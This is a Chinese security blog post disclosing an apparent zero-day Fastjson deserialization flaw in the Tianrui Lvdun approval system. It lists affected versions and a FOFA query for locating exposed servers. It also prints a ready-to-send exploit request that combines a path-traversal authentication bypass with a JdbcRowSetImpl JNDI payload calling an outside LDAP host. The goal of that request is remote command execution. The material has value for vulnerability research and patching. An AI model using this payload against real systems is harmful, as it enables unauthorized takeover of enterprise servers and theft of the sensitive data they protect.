---
title: "天锐绿盾审批系统 /ext/mail/update/{mailId} fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-update-rce.html
asset_dir: assets/天锐绿盾审批系统-extmailupdate{mailid}-fastjson反序列化漏洞
---

# 天锐绿盾审批系统 /ext/mail/update/{mailId} fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/7 08:31
- 372浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

授权

安全

Web安全书籍

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

漏洞修复方案

该系统的 `/ext/mail/update/{mailId}` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的[反序列化](https://mrxn.net/tag/rce)缺陷，在未经授权的情况下，在服务器端[执行任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 计算机安全

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /ext/mail/update/{mailId} fastjson反序列化漏洞](images/img-001-58d93ac2ebfa.webp)](https://image.mrxn.net/2bd5d068998649b48c22059870481e09.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

再看`/ext/mail/update/{mailId}` 的实现部分

[![天锐绿盾审批系统 /ext/mail/update/{mailId} fastjson反序列化漏洞](images/img-002-6e78d25b4e45.webp)](https://image.mrxn.net/e7608de8fc9d45b9ac33cc534e83cce4.webp)

请求body被直接用于`JSONObject.parseObject`进行[反序列化](https://mrxn.net/tag/rce)操作，非常明显的fastjson反序列化漏洞没啥好分析的。

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

网络安全

[![天锐绿盾审批系统 /ext/mail/update/{mailId} fastjson反序列化漏洞](images/img-003-749e5f7a3cd1.webp)](https://image.mrxn.net/4b0772a024e343bdbdb00660bf62f516.webp)

```
POST /trwfe/login.jsp/.%2e/rest/ext/mail/update/1 HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://192.168.168.11:50389/165c51",
    "autoCommit": true
}
```

成功执行`dir`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /ext/mail/update/{mailId} fastjson反序列化漏洞](images/img-004-b45aedebded6.webp)](https://image.mrxn.net/94883de34a7c4f018f630492f4deaef9.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
